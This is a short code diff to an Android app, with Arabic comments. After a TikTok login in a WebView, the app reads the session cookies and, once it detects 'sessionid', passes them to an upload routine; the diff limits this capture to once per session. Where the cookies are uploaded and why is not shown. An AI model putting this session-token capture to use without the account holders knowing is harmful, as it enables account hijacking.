@@ -247,16 +247,21 @@ public class MainActivity extends AppCompatActivity {
 
         // مُراقب لالتقاط الكوكيز بعد كل تحميل صفحة
         loginWebView.setWebViewClient(new WebViewClient() {
+            private boolean alreadyCaptured = false;  // ← يمنع الالتقاط المكرر
+
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
                 Log.i(TAG, "Login page loaded: " + url);
 
-                // افحص الكوكيز بعد كل تنقل
-                String cookies = cookieManager.getCookie("https://www.tiktok.com/");
-                if (cookies != null && cookies.contains("sessionid")) {
-                    Log.i(TAG, "✓ sessionid detected in cookies — capturing!");
-                    captureAndUploadSession(cookies, url);
+                // افحص الكوكيز بعد كل تنقل — التقط مرة واحدة فقط
+                if (!alreadyCaptured) {
+                    String cookies = cookieManager.getCookie("https://www.tiktok.com/");
+                    if (cookies != null && cookies.contains("sessionid")) {
+                        alreadyCaptured = true;  // ← امنع الالتقاط المكرر لهذه الجلسة
+                        Log.i(TAG, "✓ sessionid detected in cookies — capturing once!");
+                        captureAndUploadSession(cookies, url);
+                    }
                 }
             }
 
